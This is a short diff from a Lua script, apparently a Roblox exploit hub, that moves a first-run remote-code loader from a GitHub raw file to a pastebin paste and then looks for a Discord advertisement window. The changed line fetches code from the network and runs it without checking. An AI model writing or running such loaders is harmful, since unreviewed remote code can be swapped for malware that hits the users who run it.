@@ -20,7 +20,7 @@ do
     end)
     if not getgenv().SPHubIsFirstTime then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/DiscordADgui"))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/jdQ2nAWw"))()
             game:GetService("CoreGui"):FindFirstChild("DiscordAdUI")
 
             repeat
